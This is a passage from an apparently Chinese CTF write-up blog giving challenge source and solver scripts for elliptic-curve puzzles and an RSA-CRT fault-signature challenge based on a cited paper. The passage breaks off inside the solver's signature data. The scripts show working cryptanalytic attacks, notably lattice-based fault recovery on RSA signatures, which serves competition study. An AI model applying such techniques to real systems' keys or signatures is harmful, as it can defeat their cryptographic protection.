$y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程， exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"number\">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\">b = <span class=\"number\">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\">x1 = <span class=\"number\">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\">x2 = <span class=\"number\">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"></span><br><span class=\"line\">K = GF(p)</span><br><span class=\"line\">n=(K(x2+<span class=\"number\">2</span>*x1)).sqrt()</span><br><span class=\"line\">P.&lt;x&gt;= PolynomialRing(K)</span><br><span class=\"line\">A=<span class=\"number\">1</span></span><br><span class=\"line\">B=<span class=\"number\">6</span>*x1**<span class=\"number\">2</span>-<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1</span><br><span class=\"line\">C=-(<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1**<span class=\"number\">3</span>+<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*b-<span class=\"number\">9</span>*x1**<span class=\"number\">4</span>)</span><br><span class=\"line\">f=A*x**<span class=\"number\">2</span>+B*x+C</span><br><span class=\"line\">roots=f.roots()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(roots)</span><br><span class=\"line\">flag=roots[<span class=\"number\">1</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(<span class=\"built_in\">int</span>(flag)))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"strange-curve\"><a href=\"#strange-curve\" class=\"headerlink\" title=\"strange curve\"></a>strange curve</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">P,Q</span>):</span><br><span class=\"line\">    (x1,y1)=P</span><br><span class=\"line\">    (x2,y2)=Q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    x3=(x1+x2)*(<span class=\"number\">1</span>+y1*y2)*invert((<span class=\"number\">1</span>+x1*x2)*(<span class=\"number\">1</span>-y1*y2),p)%p</span><br><span class=\"line\">    y3=(y1+y2)*(<span class=\"number\">1</span>+x1*x2)*invert((<span class=\"number\">1</span>-x1*x2)*(<span class=\"number\">1</span>+y1*y2),p)%p</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (x3,y3)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">e,P</span>):</span><br><span class=\"line\">    Q=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    e=e%p</span><br><span class=\"line\">    <span class=\"keyword\">while</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> e&amp;<span class=\"number\">1</span>:</span><br><span class=\"line\">            Q=add(Q,P)</span><br><span class=\"line\">        P=add(P,P)</span><br><span class=\"line\">        e&gt;&gt;=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Q</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Legendre</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"built_in\">pow</span>((a%p+p)%p,(p-<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_ts</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    p=p-<span class=\"number\">1</span></span><br><span class=\"line\">    count=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> p%<span class=\"number\">2</span>==<span class=\"number\">0</span>:</span><br><span class=\"line\">        count+=<span class=\"number\">1</span></span><br><span class=\"line\">        p=p//<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> count,p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_nonre</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> Legendre(a,p)==<span class=\"number\">1</span>:</span><br><span class=\"line\">        a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">amm2</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    t,s=get_ts(p)</span><br><span class=\"line\">    ta=<span class=\"built_in\">pow</span>(get_nonre(p),s,p)</span><br><span class=\"line\">    tb=<span class=\"built_in\">pow</span>(a,s,p)</span><br><span class=\"line\">    h=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,t):</span><br><span class=\"line\">        d=<span class=\"built_in\">pow</span>(tb,<span class=\"number\">2</span>**t-<span class=\"number\">1</span>-i,p)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d==<span class=\"number\">1</span>:</span><br><span class=\"line\">            k=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            k=<span class=\"number\">1</span></span><br><span class=\"line\">        tb=(tb*<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>*k,p))%p</span><br><span class=\"line\">        h=(h*<span class=\"built_in\">pow</span>(ta,k,p))%p</span><br><span class=\"line\">        ta=<span class=\"built_in\">pow</span>(ta,<span class=\"number\">2</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> h*<span class=\"built_in\">pow</span>(a,(s+<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p)%p  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">a,b,c,p</span>):</span><br><span class=\"line\">    tmpa=<span class=\"number\">1</span></span><br><span class=\"line\">    tmpb=b*inverse(a,p)%p</span><br><span class=\"line\">    tmpc=c*inverse(a,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> Legendre(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)==<span class=\"number\">1</span></span><br><span class=\"line\">    res1=(amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    res2=(-amm2(tmpb**<span class=\"number\">2</span>*inverse(<span class=\"number\">4</span>,p)-tmpc,p)-tmpb*inverse(<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (res1,res2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lift</span>(<span class=\"params\">x,a,b,p</span>):</span><br><span class=\"line\">    tmp=b*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)*inverse(a*x,p)%p</span><br><span class=\"line\">    <span class=\"keyword\">return</span> solve(<span class=\"number\">1</span>,-tmp,-<span class=\"number\">1</span>,p)[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"number\">9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353</span></span><br><span class=\"line\">a=<span class=\"number\">54733430689690725746438325219044741824500093621550218736194675295708808435509</span></span><br><span class=\"line\">b=<span class=\"number\">75237024593957256761258687646797952793573177095902495908321724558796076392871</span></span><br><span class=\"line\">x=bytes_to_long(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        y=lift(x,a,b,p)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        x+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> a*x*(y**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p==b*y*(x**<span class=\"number\">2</span>-<span class=\"number\">1</span>)%p</span><br><span class=\"line\"></span><br><span class=\"line\">P=(x,y)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\">eP=mul(e,P)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;P = <span class=\"subst\">&#123;P&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;eP = <span class=\"subst\">&#123;eP&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">P = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)</span></span><br><span class=\"line\"><span class=\"string\">eP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。<br>直接拿第一个数 <code>long_to_bytes</code> ，得到flag。</p>\n<h2 id=\"Learning-with-fault\"><a href=\"#Learning-with-fault\" class=\"headerlink\" title=\"Learning with fault\"></a>Learning with fault</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RSA</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,p,q,e</span>):</span><br><span class=\"line\">        self.p=p</span><br><span class=\"line\">        self.q=q</span><br><span class=\"line\">        self.e=e</span><br><span class=\"line\">        self.phi=(p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.d=invert(self.e,self.phi)</span><br><span class=\"line\">        self.dp=self.d%(p-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.dq=self.d%(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.n=p*q</span><br><span class=\"line\">        self.N=getPrime(<span class=\"number\">512</span>)*getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">corrupt_sign</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        m=bytes_to_long(message)</span><br><span class=\"line\">        sig_p=<span class=\"built_in\">pow</span>(m,self.dp,self.p)</span><br><span class=\"line\">        sig_q=<span class=\"built_in\">pow</span>(m,self.dq,self.q)</span><br><span class=\"line\">        alpha=q*invert(q,p)</span><br><span class=\"line\">        beta=p*invert(p,q)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">verify</span>(<span class=\"params\">self,message,sign</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> long_to_bytes(<span class=\"built_in\">pow</span>(bytes_to_long(sign),self.e,self.n))==message</span><br><span class=\"line\"></span><br><span class=\"line\">p=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">q=getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">e=<span class=\"number\">65537</span></span><br><span class=\"line\">rsa=RSA(p,q,e)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f1:</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;corrupted_sign.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f2:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">            message=os.urandom(<span class=\"number\">64</span>)</span><br><span class=\"line\">            sign=rsa.sign(message)</span><br><span class=\"line\">            corrupted_sign=rsa.corrupt_sign(message)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> rsa.verify(message,sign)</span><br><span class=\"line\">            f1.write(<span class=\"built_in\">str</span>(sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">            f2.write(<span class=\"built_in\">str</span>(corrupted_sign)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">enc=<span class=\"built_in\">pow</span>(bytes_to_long(flag),rsa.e,rsa.n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;n = <span class=\"subst\">&#123;rsa.n&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;N = <span class=\"subst\">&#123;rsa.N&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;e = <span class=\"subst\">&#123;rsa.e&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;enc = <span class=\"subst\">&#123;enc&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">n = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\"><span class=\"string\">N = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\"><span class=\"string\">e = 65537</span></span><br><span class=\"line\"><span class=\"string\">enc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>出题论文：<a href=\"https://eprint.iacr.org/2011/388.pdf\">https://eprint.iacr.org/2011/388.pdf</a><br>这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。<br>后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。<br>照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。<br>exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> combinations</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">co_sig = [<span class=\"string\">b&quot;\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&amp;H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-&#x27;\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&amp;w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&amp;&#x27;&#123;\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe&quot;\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3&#125;0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&amp;&#125;a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb&#123;\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d&lt;(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&quot;0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed&#125;\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN&#x27;\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&amp;&amp;`\\xfd*\\xe1\\xf2\\x9c&quot;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;:\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&amp;\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+&#x27;</span>,</span><br><span class=\"line\">          <span class=\"string\">b&#x27;\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac 